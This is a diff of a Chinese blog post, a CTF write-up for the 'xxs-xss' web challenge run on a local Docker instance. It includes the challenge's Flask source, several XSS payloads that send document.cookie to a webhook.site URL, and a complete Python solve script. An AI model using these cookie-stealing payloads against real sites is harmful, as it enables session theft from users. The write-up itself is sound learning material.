-<p>在 <code>index.html</code> 程式碼的第四行 :
-<code>const params = new URLSearchParams(window.location.search);</code></p>
-<h4 id="建構-payload-點-1">建構 payload 點-1</h4>
-<ul>
-<li>有沒有可能改變 <code>window.location</code> 的值，讓他連上外網傳送 cookie?</li>
-</ul>
-<p>接著在 <a href="https://github.com/payloadbox/xss-payload-list">xss-payload-list</a> 裡面看到一個可能有用的 payload :<code>&lt;img src =q onerror=prompt(8)&gt;</code></p>
-<h4 id="建構-payload-點-2">建構 payload 點-2</h4>
-<ul>
-<li>把 oneerror 後面那串改成我們的外網連結並加上 document.cookie</li>
-</ul>
-<p><strong>但是要怎麼觸發 oneerror?</strong></p>
-<p><a href="https://aszx87410.github.io/beyond-xss/ch1/javascript-protocol/#%E4%BB%80%E9%BA%BC%E6%98%AF-javascript-%E5%81%BD%E5%8D%94%E8%AD%B0">javascript 偽協議</a> 這篇文章給了我答案</p>
-<h4 id="建構-payload-點-3">建構 payload 點-3</h4>
-<ul>
-<li>url 要以 <code>http://localhost:5000/</code> 開頭，並且加上 <code>url=javascript:name</code>，其中 name 的值就是 oneerror 那段程式碼</li>
-</ul>
-<h4 id="開始嘗試-payload">開始嘗試 payload</h4>
-<p>first_payload =
-<code>&lt;img src=x onerror='location.href=\&quot;{WEBHOOK}/?flag=\&quot;+btoa(document.cookie)'&gt;&amp;url=http://localhost:5000/?url=javascript:name</code></p>
-<p>將這個 payload 透過腳本串接，結果如下圖 :
-<img src="/images/xxs-xss-payload-1.png" alt="xxs-xss-payload-1"></p>
-<p>欸可是?沒連到外網?</p>
-<p>去看了 container 的 config :
-<img src="/images/xxs-xss-config-1.png" alt="xxs-xss-config-1"></p>
-<p>在這裡卡很久，一直覺得 url 長度剛好 15 沒超過，為甚麼沒有觸發到 name 的部分??</p>
-<p>於是開始了排列組合遊戲 (好玩愛玩下次不玩了QQ)</p>
-<p>second_payload =
-<code>url=http://localhost:5000/?url=javascript:name&amp;name=&lt;img src=x onerror='location.href=\&quot;{WEBHOOK}/?flag=\&quot;+btoa(document.cookie)'&gt;</code></p>
-<p>在經過腳本串接後，得到一樣的回應 和 config :
-<img src="/images/xxs-xss-payload-2.png" alt="xxs-xss-payload-2">
-<img src="/images/xxs-xss-config-2.png" alt="xxs-xss-config-2"></p>
-<p>還是沒連到外網</p>
-<p>在這裡卡了好多天，程式碼看到睡覺還會夢到，超可怕</p>
-<p>最後有幸得到高人指點迷津 :</p>
-<p><img src="/images/xxs-xss-hint.png" alt="xxs-xss-hint"></p>
-<p><del>很明顯我的排列組合遊戲根本沒有好好玩過一遍</del></p>
-<p>再看一次程式碼，尤其是 <code>app.py</code> 的<code>visit()</code> 函式</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">visit</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">nonce</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;nonce&#39;</span><span class="p">)</span>
-</span></span></code></pre></div><div class="info-box">
-<strong>
-<p>簡單來說，/visit 只有兩個 query string : url 和 nonce，而 name 不會，<del>就算 name 再好看他都視而不見</del>。</p>
-<p>前面兩個 payload Bot 訪問的都是 <code>/?url=javasceript:name</code>，name 的值沒有被 url 帶進去，所以是空的，就算跳轉到 <code>javascript:name</code> 也不會執行</p>
-<p>所以要讓 url 帶進去的參數有 name 的值，一開始就要讓 url 帶上 name，再接 <code>&amp;url=javasceipt:name&amp;nonce={}</code>，<code>request.args.get(&quot;url&quot;)</code> 會把整段 url 的參數讓 Bot 去訪問，這樣跳轉到 <code>javascript:name</code> 才有意義
-</strong></p>
-</div>
-<details open> <summary>最終 script</summary>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">BASE</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:21337&#34;</span>   
-</span></span><span class="line"><span class="cl"><span class="n">WEBHOOK</span> <span class="o">=</span> <span class="s2">&#34;https://webhook.site/422cda5d-b5d7-4998-8046-fdd591edc79b&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve_pow</span><span class="p">(</span><span class="n">challenge</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="s2">&#34;000000&#34;</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000000000</span><span class="p">):</span> 
-</span></span><span class="line"><span class="cl">        <span class="n">nonce</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">((</span><span class="n">challenge</span> <span class="o">+</span> <span class="n">nonce</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">h</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">prefix</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">nonce</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># 1. 拿 PoW challenge</span>
-</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE</span><span class="si">}</span><span class="s2">/get_challenge&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">j</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="n">challenge</span> <span class="o">=</span> <span class="n">j</span><span class="p">[</span><span class="s2">&#34;challenge&#34;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Challenge: </span><span class="si">{</span><span class="n">challenge</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># 2. 解 PoW</span>
-</span></span><span class="line"><span class="cl">    <span class="n">nonce</span> <span class="o">=</span> <span class="n">solve_pow</span><span class="p">(</span><span class="n">challenge</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">nonce</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Failed to solve PoW&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Nonce: </span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># 3. 構造 payload</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">encode_payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&lt;img src=x onerror=&#39;location.href=</span><span class="se">\&#34;</span><span class="si">{</span><span class="n">WEBHOOK</span><span class="si">}</span><span class="s2">/?flag=</span><span class="se">\&#34;</span><span class="s2">+btoa(document.cookie)&#39;&gt;&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">test_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://localhost:5000/?name=</span><span class="si">{</span><span class="n">encode_payload</span><span class="si">}</span><span class="s2">&amp;url=javascript:name&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">encode_test_payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">test_payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">exploit_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE</span><span class="si">}</span><span class="s2">/visit?url=</span><span class="si">{</span><span class="n">encode_test_payload</span><span class="si">}</span><span class="s2">&amp;nonce=</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Exploit URL:</span><span class="se">\n</span><span class="si">{</span><span class="n">exploit_url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># 4. 發送請求（保持同一個 session）</span>
-</span></span><span class="line"><span class="cl">    <span class="n">r2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">exploit_url</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Response:&#34;</span><span class="p">,</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
-</span></span></code></pre></div></details>
-<p><img src="/images/xxs-xss-config-3.png" alt="xxs-xss-config-3"></p>
-<p>成功訪問外網啦(歡呼~)</p>
-<p>去外網找 flag</p>
-<p><img src="/images/xxs-xss-webhook.png" alt="xxs-xss-webhook"></p>
-<p>得到一串 base64，解碼就得到 flag 了</p>
-<p>最終訪問的 payload :
-<code>url=http%3A//localhost%3A5000/%3Fname%3D%253Cimg%2520src%253Dx%2520onerror%253D%2527location.href%253D%2522{WEBHOOK}/%253Fflag%253D%2522%252Bbtoa%2528document.cookie%2529%2527%253E%26url%3Djavascript%3Aname&amp;nonce=18235395</code></p>
-<div class="warning-box">
-<strong>
-<p>整個過程原理就是 :</p>
-<p>javascript 偽協議會先執行變數的內容，觸發 oneerror，接著才會渲染頁面(index.html)</p>
-<p>這是 javascript 偽協議特有的特性</p>
-<p>最後總結一下之前卡住的原因 :</p>
-<ol>
-<li>一直覺得 url 的長度不能超過15，所以 <code>/?url=javascript:name</code>，是唯一解</li>
-<li>但其實至少要讓網站可以讀到 name 的值，就算有 textContent 也沒關係，因為 javascript 偽協議會先執行</li>
-</ol>
-</strong>
-</div>
-<h2 id="flag">Flag</h2>
-<div class="flag-box">
-<strong>
-flag : NHNC{FAKE_FLAG}
-</strong>
-</div></article>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </main>
-</div>
-<script type="application/javascript" src='https://lyccyc.github.io/penguin.cyc/js/toc.js'></script>
-<link rel="stylesheet" href='https://lyccyc.github.io/penguin.cyc/css/toc.css' />
-
-  
-</div>
-
-  <div class="footer container-xl width-full p-responsive">
-  <div
-    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
-    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="https://lyccyc.github.io/penguin.cyc/">
-      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
-        <path fill-rule="evenodd"
-          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
-        </path>
-      </svg>
-    </a>
-    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
-      
-      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
-      
-      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
-    </ul>
-  </div>
-  <div class="d-flex flex-justify-center pb-6">
-    <span class="f6 text-gray-light"></span>
-  </div>
-
-
-</div>
-
-</body>
-
-<script type="application/javascript" src="https://lyccyc.github.io/penguin.cyc/js/github-style.js"></script>
-
-
-
-
-
-
-
-</html>
+"><meta property="og:url" content="https://lyccyc.github.io/penguin.cyc/post/ctf_xxs-xss/"><meta property="og:site_name" content="CTF_xxs-xss"><meta property="og:image" content="https://lyccyc.github.io/penguin.cyc/"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2025-09-08 12:44:13 +0800 CST"></head><body><div style=position:relative><header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on"><div class="Header-item mobile-none" style=margin-top:-4px;margin-bottom:-4px><a class=Header-link href=https://lyccyc.github.io/penguin.cyc/><img class=octicon height=32 width=32 src></a></div><div class="Header-item d-md-none"><button class="Header-link btn-link js-details-target" type=button onclick='document.querySelector("#header-search").style.display=document.querySelector("#header-search").style.display=="none"?"block":"none"'>
+<svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" width="24"><path fill-rule="evenodd" d="M1 2.75A.75.75.0 011.75 2h12.5a.75.75.0 110 1.5H1.75A.75.75.0 011 2.75zm0 5A.75.75.0 011.75 7h12.5a.75.75.0 110 1.5H1.75A.75.75.0 011 7.75zM1.75 12a.75.75.0 100 1.5h12.5a.75.75.0 100-1.5H1.75z"/></svg></button></div><div style=display:none id=header-search class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex"><div class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to"><div class=position-relative><form target=_blank action=https://www.google.com/search accept-charset=UTF-8 method=get autocomplete=off><label class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center"><input type=text class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable" name=q placeholder=Search autocomplete=off>
+<input type=hidden name=q value=site:https://lyccyc.github.io/penguin.cyc/></label></form></div></div></div><div class="Header-item Header-item--full flex-justify-center d-md-none position-relative"><a class=Header-link href=https://lyccyc.github.io/penguin.cyc/><img class="octicon octicon-mark-github v-align-middle" height=32 width=32 src></a></div><div class=Header-item style=margin-right:0><a href=javascript:void(0) class="Header-link no-select" onclick=switchTheme()><svg style="fill:var(--color-profile-color-modes-toggle-moon)" class="no-select" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.52208 7.71754c3.05612.0 5.53362-2.47748 5.53362-5.5336C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961 9.95801 1.07727 10.3495.771159 10.6474.99992c1.4679 1.12724 2.4141 2.90007 2.4141 4.89391.0 3.40575-2.7609 6.16667-6.16665 6.16667-2.94151.0-5.40199-2.0595-6.018122-4.81523C.794841 6.87902 1.23668 6.65289 1.55321 6.85451 2.41106 7.40095 3.4296 7.71754 4.52208 7.71754z"/></svg></a></div></header></div><div id=search-result class="container-lg px-3 new-discussion-timeline" style=display:none></div><div class=application-main><div><main><div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4"><div class=px-0><div class="mb-3 d-flex px-3 px-md-3 px-lg-5"><div class="flex-auto min-width-0 width-fit mr-3"><div class=d-flex><div class="d-none d-md-block"><a class="avatar mr-2 flex-shrink-0" href=https://lyccyc.github.io/penguin.cyc/><img class=avatar-user src=/images/penguin.png width=32 height=32></a></div><div class="d-flex flex-column"><h1 class="break-word f3 text-normal mb-md-0 mb-1"><span class=author><a href=https://lyccyc.github.io/penguin.cyc/>陳昱臻(企鵝)</a>
+</span><span class=path-divider>/</span>
+<strong class="css-truncate css-truncate-target mr-1" style=max-width:410px><a href=https://lyccyc.github.io/penguin.cyc/post/ctf_xxs-xss/>CTF_xxs-xss</a></strong></h1><div class="note m-0">Created <relative-time datetime="Mon, 08 Sep 2025 12:44:13 +0800" class=no-wrap>Mon, 08 Sep 2025 12:44:13 +0800</relative-time></div></div></div></div></div></div></div><div class="container-lg px-3 new-discussion-timeline"><div class="repository-content gist-content"><div><div class="js-gist-file-update-container js-task-list-container file-box"><div id=file-pytest class="file my-2"><div id=post-header class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style=z-index:2><div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto"><div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0"><summary id=toc-toggle onclick=clickToc() class="btn btn-octicon m-0 mr-2 p-2"><svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered"><path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zm0 5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zm0 5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zM3 8A1 1 0 111 8a1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"/></svg></summary><details-menu class=SelectMenu id=toc-details style="display: none;"><div class="SelectMenu-modal rounded-3 mt-1" style=max-height:340px><div class="SelectMenu-list SelectMenu-list--borderless p-2" style=overscroll-behavior:contain id=toc-list></div></div></details-menu>1681 Words</div><div class="file-actions flex-order-2 pt-0"><a class="muted-link mr-3" href=/tags/ctf><svg class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M2.5 7.775V2.75a.25.25.0 01.25-.25h5.025a.25.25.0 01.177.073l6.25 6.25a.25.25.0 010 .354l-5.025 5.025a.25.25.0 01-.354.0l-6.25-6.25A.25.25.0 012.5 7.775zm-1.5.0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464.0.91.184 1.238.513l6.25 6.25a1.75 1.75.0 010 2.474l-5.026 5.026a1.75 1.75.0 01-2.474.0l-6.25-6.25A1.75 1.75.0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z"/></svg>
+CTF
+</a><a class="muted-link mr-3" href=/tags/website><svg class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M2.5 7.775V2.75a.25.25.0 01.25-.25h5.025a.25.25.0 01.177.073l6.25 6.25a.25.25.0 010 .354l-5.025 5.025a.25.25.0 01-.354.0l-6.25-6.25A.25.25.0 012.5 7.775zm-1.5.0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464.0.91.184 1.238.513l6.25 6.25a1.75 1.75.0 010 2.474l-5.026 5.026a1.75 1.75.0 01-2.474.0l-6.25-6.25A1.75 1.75.0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z"/></svg>
+Website
+</a><a class="muted-link mr-3" href=/tags/docker><svg class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M2.5 7.775V2.75a.25.25.0 01.25-.25h5.025a.25.25.0 01.177.073l6.25 6.25a.25.25.0 010 .354l-5.025 5.025a.25.25.0 01-.354.0l-6.25-6.25A.25.25.0 012.5 7.775zm-1.5.0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464.0.91.184 1.238.513l6.25 6.25a1.75 1.75.0 010 2.474l-5.026 5.026a1.75 1.75.0 01-2.474.0l-6.25-6.25A1.75 1.75.0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z"/></svg>
+Docker</a></div></div></div><div class="Box-body px-5 pb-5" style=z-index:1><article class="markdown-body entry-content container-lg"><h1 id=xxs-xss>xxs-xss</h1><blockquote><p>人生第一題破解出來的 xss，祖墳冒煙啦</p></blockquote><p>這是2025 No Hack No CTF 的 web 題目，拿來自己練習，花了一個多禮拜QQ</p><h2 id=description>Description</h2><p>用 Docker 架起來後連線到 http://localhost:21337/</p><p>頁面顯示如下</p><p><img src=/images/xxs-xss-guest.png alt=xxs-xss-guest></p><p>hmmm，甚麼都沒有</p><h2 id=solution>Solution</h2><p>根據題目給的 source code，先去觀察 <code>app.py</code></p><details open><summary>app.py 程式碼</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>jsonify</span><span class=p>,</span> <span class=n>abort</span><span class=p>,</span> <span class=n>redirect</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>make_response</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>FLAG</span> <span class=o>=</span> <span class=s1>&#39;NHNC</span><span class=si>{FAKE_FLAG}</span><span class=s1>&#39;</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>terminate_process</span><span class=p>(</span><span class=n>process</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>process</span><span class=o>.</span><span class=n>terminate</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Process terminated after 20 seconds.&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/get_challenge&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_challenge</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>challenge</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=p>[</span><span class=s1>&#39;challenge&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>challenge</span>
+</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=p>[</span><span class=s1>&#39;ts&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;challenge&#34;</span><span class=p>:</span> <span class=n>challenge</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;Find a nonce such that SHA256(challenge + nonce) starts with 000000&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/visit&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>visit</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;url&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>nonce</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;nonce&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>url</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>nonce</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Missing url or nonce&#34;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>url</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;http://localhost:5000/&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Bad Hacker&#34;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>challenge</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;challenge&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ts</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;ts&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>challenge</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>ts</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;No challenge in session. Please request /get_challenge first.&#34;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>ts</span> <span class=o>&gt;</span> <span class=mi>60</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>session</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;challenge&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>session</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;ts&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Challenge expired. Please request a new one.&#34;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=cl>
